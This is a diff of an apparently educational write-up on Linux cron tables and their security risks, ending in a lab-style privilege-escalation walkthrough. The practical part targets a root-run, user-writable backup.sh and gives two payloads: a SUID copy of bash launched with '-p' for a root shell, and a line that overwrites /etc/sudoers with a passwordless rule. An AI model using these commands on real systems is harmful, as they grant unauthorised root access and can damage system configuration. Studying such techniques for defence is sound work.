@@ -45,19 +45,24 @@ The cron job above will execute /home/kayem/script.sh at 5:30 every second day o
 
 ## Managing cron tables
 
-There are two types of cron tables: system and user. System cron tables are located at `etc/crontab` and require root privileges to edit. They contain scheduled tasks that apply to the entire system and tasks that require root privileges for high-privileged operations. To edit the system cron table, you have to use a text editor such as Vim, or Nano, as attempting to edit it with `sudo cron tab -e` will revise the personal cron table of the root user; rather than the system cron table. As for the user cron table, each user has their own cron table. Although not created automatically, they can be created by a system administrator or the user. An admin can create a cron table for a user with the command:
+System cron tables are located at `/etc/crontab` and require root privileges to edit. They contain scheduled tasks that apply to the entire system or require root privileges for high-privileged operations. To edit the system cron table, modify `/etc/crontab` as attempting to edit it with `sudo cron tab -e` will revise the personal cron table of the root user; rather than the system cron table. 
+
+Each user has their own cron table. Although not created by default, a system administrator or user can make a cron table with the following commands, respectively.
 ```
 crontab -e -u [USER]
+```
+```
+crontab -e
 ```
 Users can create a cron table without root privileges but are limited to scheduling tasks with the files they have permission to execute.
 
 ## Security implications of cron jobs
 
-If misconfigured, cron jobs can exploit high privileges and gain unauthorised access to critical system resources. Therefore, it is necessary that personal cron jobs run with the privileges of the user; rather than higher privileged users. If a cron job file has the SUID bit set, is owned by a higher privileged user, like root, and a regular user has write permissions, they can inject malicious code to be executed that spawns a root shell, deletes critical files, terminates services, and the like.
+If misconfigured, cron jobs can be executed with elevated privileges and gain unauthorised access to critical system resources. Therefore, it is necessary that personal cron jobs run with the user's privileges; rather than higher privileged users. If a cron job file has the SUID bit set, is owned by a higher privileged user and permits writability to other users, malicious code can be injected into the cron job file.
 
 ## Practical
 
-I began by identifying which cron jobs the user has access to with `crontab -e`, for local cron jobs, or `cat /etc/crontab` for system-wide cron jobs. With `cat /etc/crontab` 
+I identify accessible cron jobs with `crontab -e` for local cron jobs and `cat /etc/crontab` for system-wide cron jobs. The user does not have a personal cron table, yet they are granted access to the following system-wide cron jobs. 
 
 ```
 * * * * *  root /antivirus.sh
@@ -65,11 +70,11 @@ I began by identifying which cron jobs the user has access to with `crontab -e`,
 * * * * *  root /home/karen/backup.sh
 * * * * *  root /tmp/test.py
 ```
-These four cron jobs are executed as root. Since '/home/karen/backup.sh' is writable by my user, I will target this cron job to escalate privileges.
+To edit the cron job file, you must have write permissions so I identify files which can be written to by my user.
 ```
 ls -l /home/karen/backup.sh
 ```
-For the script to be run by the cron job, it must have execute privileges.  
+For the cron table to execute the cron job, it must have execute privileges.  
 ```
 chmod +x /home/karen/backup.sh
 ```
@@ -77,16 +82,21 @@ You can modify the `backup.sh` following two methods to escalate privileges.
 
 ### Method 1
 
-The following payload 
+The following payload copies the `/bin/bash` binary to `/tmp/bash` and appoints the SUID bit so that it can run with the privileges of the root user (the owner of the `/home/karen/backup.sh` file.
 
-`cp /bin/bash /tmp/bash; chmod +s /tmp/bash`
+```
+cp /bin/bash /tmp/bash; chmod +s /tmp/bash
+```
+The copied binary is then executed in privileged mode to create a new bash shell session with the effective User ID of 0 (root).
 
 '/tmp/bash -p'
 
 ### Method 2
 
-Alternatively, add your user to the /etc/sudoers file!
+Alternatively, add the user to the /etc/sudoers file.
 
 ```
 echo "karen ALL=(root) NOPASSWD: ALL" > /etc/sudoers
 ```
+
+Since this cron job has been scheduled to run each minute, wait a minute for the payload to take effect.
